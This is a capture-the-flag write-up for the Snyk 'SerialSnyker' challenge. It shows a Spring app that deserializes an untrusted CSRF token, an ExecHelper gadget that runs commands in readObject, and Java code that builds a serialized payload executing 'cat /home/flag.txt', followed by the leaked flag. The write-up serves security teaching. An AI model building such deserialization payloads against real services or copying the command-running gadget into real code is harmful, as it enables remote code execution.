# 2022 Snyk - SerialSnyker

We were given source code and URL to the web app. By looking at the code:
```java
package com.snykctf.serialsnyker;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class IndexController {

    @GetMapping("/")
    public String index(Model model,
                        HttpServletRequest request,
                        HttpServletResponse response) throws IOException {
        model.addAttribute("csrfToken", this.getCSRFToken());
        return "index";
    }

    @PostMapping("/")
    public String authenticate(Model model,
                               @RequestParam String username,
                               @RequestParam String password,
                               @RequestParam String csrfToken) throws Exception {

        CSRFToken token = new CSRFToken();
        Object obj = null;
         try {
            obj = SerializationUtils.deserialize(csrfToken);
            System.out.println("TEST");
            System.out.println(obj);
            token = (CSRFToken) obj;
        model.addAttribute("exception", "helloworld!!");
        } catch (Exception ex) {
             if (obj == null) {
                 model.addAttribute("error", ex.getMessage());
             } else {
                 model.addAttribute("error", obj.toString() + ex.getMessage());
             }

             return "index";
        } catch (Error ex) {
             model.addAttribute("error",  ex.getMessage());
             return "index";
         }

        model.addAttribute("csrfToken", this.getCSRFToken());
        return "index";
    }

    private String getCSRFToken() {
        CSRFToken token = new CSRFToken();
        return SerializationUtils.serialize(token);
    }

}
```

We see a lot of usage of `SerializationUtils`, which contains:
```java
package com.snykctf.serialsnyker;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class SerializationUtils {
    public static String serialize(Object item) {
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        final ObjectOutputStream objectOutputStream;
        try {
            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(item);
            objectOutputStream.close();
            byte[] bytes = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());
            return new String(bytes, StandardCharsets.US_ASCII);
        } catch (IOException e) {
            throw new Error(e);
        }
    }

    public static Object deserialize(String data) {
        try {
            byte[] objBytes = Base64.getDecoder().decode(data);
            final ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(objBytes);
            final ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            final Object obj = objectInputStream.readObject();
            objectInputStream.close();
            return obj;
        } catch (IOException e) {
            throw new Error(e);
        } catch (ClassNotFoundException e) {
            throw new Error(e);
        }
    }
}
```

This already heavily hints on a Java deserialization vulnerability, but we still need to find a potential gadget. 
This was until we saw `ExecHelper.java`:
```java
package com.snykctf.serialsnyker;

import java.io.*;
import java.util.Arrays;

public class ExecHelper implements Serializable {
    private Base64Helper[] command;
    private String output;

    public ExecHelper(Base64Helper[] command) throws IOException {
        this.command = command;
    }

    public void run() throws IOException {
        String[] command = new String[this.command.length];
        for (int i = 0; i < this.command.length; i++) {
            String str = this.command[i].decode();
            command[i] = str;
        }

        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        String result =  s.hasNext() ? s.next() : "";
        System.out.println("executing...");
        System.out.println(result);
        this.output = result;
        /*Process process = Runtime.getRuntime().exec(command);

        BufferedReader stdInput = new BufferedReader(new
                InputStreamReader(process.getInputStream()));

        BufferedReader stdError = new BufferedReader(new
                InputStreamReader(process.getErrorStream()));

        System.out.println("Command Output:\n");
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            System.out.println(s);
        }*/
    }

    @Override
    public String toString() {
        return "ExecHelper{" +
                "command=" + Arrays.toString(command) +
                ", output='" + output + '\'' +
                '}';
    }

    private final void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        run();
    }
}
```

By overriding the `readObject` function and running a command set in the class properties, this is an easy thing to exploit.
The trick is to serialize an `ExecHelper` instance containing the command of our choice and put it into `csrfToken` parameter passed to `IndexController`.

Here is how we have generated our payload:
```java
@SpringBootApplication
public class SerialSnyker {

	public static void main(String[] args) {
		SpringApplication.run(SerialSnyker.class, args);
	}

	@Bean
	CommandLineRunner runner() {
		return (args) -> {
			List<Base64Helper> helpers = new ArrayList<>();
			helpers.add(new Base64Helper(encoder("cat")));
			helpers.add(new Base64Helper(encoder("/home/flag.txt")));
			Base64Helper[] h = helpers.toArray(Base64Helper[]::new);
			ExecHelper eh = new ExecHelper(h);
			String a = SerializationUtils.serialize(eh);
			System.out.println(a);
			System.exit(0);
		};
	}
	
	String encoder(String what) {
		return Base64.getEncoder().encodeToString(what.getBytes());
	}
}
```

The base64 content was placed in the `csrfToken` parameter of the web app and we have obtained the flag:
```
<td >ExecHelper{command=[com.snykctf.serialsnyker.Base64Helper@5e4432d, com.snykctf.serialsnyker.Base64Helper@59532b6d], output=&#39;SNYK{09f30b0210c2c0fe55eea091a8f4b1d38cd10364af0544c5d7faa41cb4b49954}&#39;}...
```
